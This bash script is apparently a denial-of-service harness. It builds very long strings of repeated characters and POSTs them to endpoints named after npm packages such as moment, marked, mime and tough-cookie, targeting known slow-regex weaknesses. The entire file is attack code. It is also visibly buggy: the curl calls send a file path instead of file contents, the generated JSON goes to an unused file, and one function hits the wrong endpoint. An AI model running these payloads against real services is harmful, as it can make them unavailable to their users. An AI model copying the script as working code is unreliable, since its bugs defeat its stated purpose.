#!/bin/bash
set +x

generate() {
    # echo "Running generation... Hold tight." > /dev/null
    # start=`date +%s`

    LENGTH=$1
    CHAR=$2
    RESULT=""
    for ((i = 0; i <= $LENGTH; i++))
    do
        RESULT=$RESULT$CHAR
    done

    # end=`date +%s`
    # runtime=$((end-start))
    # echo "All done!" > /dev/null
    # echo "Took: ${runtime}s" > /dev/null
    echo $RESULT
}

makeJson() {
    STR=$1
    jo -p title=$STR > ../data.json
}

runAjvDos() {
    curl -d "../data/runajvdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/ajv/dos
}

runCharsetDos() {
    curl -d "../data/charsetdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/charset/dos
}

runContentTypeParserDos() {
    curl -d "../data/contenttypeparserdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/content-type-parser/dos
}

runContentDos() {
    curl -d "../data/contentdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/content/dos
}

runDebugDos() {
    curl -d "../data/debugdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/debug/dos
}

runDnsSyncDos() {
    curl -d "../data/dnssyncdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/dns-sync/dos
}

runForwardedDos() {
    curl -d "../data/forwardeddosdata.json" -H "Content-Type: application/json" -X POST ${URL}/dns-sync/dos
}

runFreshDos() {
    curl -d "../data/freshdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/fresh/dos
}

runHtmlParserDos() {
    curl -d "../data/htmlparserdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/htmlparser/dos
}

runIsMobileJsDos() {
    curl -d "../data/mobilejsdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/ismobilejs/dos
}

runLodashDos() {
    echo "Attempting POST request"
    start=`date +%s`
    curl -d "../data/lodashdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/lodash/dos
    echo ""
    echo "POST request complete: "
    end=`date +%s`
    runtime=$((end-start))
    echo "Took: ${runtime}s" 
}

runMimeDos(){
    fin="$(generate 81750 "5")"
    makeJson $fin
    curl -d "../data/mimedosdata.json" -H "Content-Type: application/json" -X POST ${URL}/mime/dos
}

runMobileDetectDos(){
    fin="$(generate 12500 "Dell")"
    makeJson $fin
    curl -d "../data/mobiledetectdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/mobile_detect/dos
}

runMomentDos(){
    fin="$(generate 50000 "1")"
    makeJson $fin
    curl -d "../data/momentdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/moment/dos
}

runNoCaseDos(){
    fin="$(generate 50000 "X")"
    makeJson $fin
    curl -d "../data/nocasedosdata.json" -H "Content-Type: application/json" -X POST ${URL}/no_case/dos
}

runParsejsonDos(){
    fin="$(generate 50000 " ")"
    makeJson $fin
    curl -d "../data/parsejsondosdata.json" -H "Content-Type: application/json" -X POST ${URL}/parsejson/dos
}

runPlatformDos(){
    fin="$(generate 30000 " ")"
    makeJson $fin
    curl -d "../data/platformdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/platform/dos
}

runSlugDos(){
    fin="$(generate 50000 " ")"
    makeJson $fin
    curl -d "../data/slugdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/slug/dos
}

runStringDos(){
    fin="$(generate 50000 "9")"
    makeJson $fin
    curl -d "../data/stringdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/string/dos
}

runToughCookieDos(){
    fin="$(generate 50000 " ")"
    makeJson $fin
    curl -d "../data/toughcookiedosdata.json" -H "Content-Type: application/json" -X POST ${URL}/tough_cookie/dos
}

runTimespanDos(){
    fin="$(generate 30000 "1")"
    makeJson $fin
    curl -d "../data/timespandosdata.json" -H "Content-Type: application/json" -X POST ${URL}/timespan/dos
}

runUnderscoreStringDos(){
    fin="$(generate 50000 "&")"
    makeJson $fin
    curl -d "../data/underscorestringdosdata.json" -H "Content-Type: application/json" -X POST ${URL}/underscore_string/dos
}
#how do I generate multiple text?
runMarkedDos() {
    fin="$(generate 8 "\`")$(generate 700 " ")$(generate 11 "\`")"
    makeJson $fin
    curl -d "../data/markeddosdata.json" -H "Content-Type: application/json" -X POST ${URL}/marked/dos
}
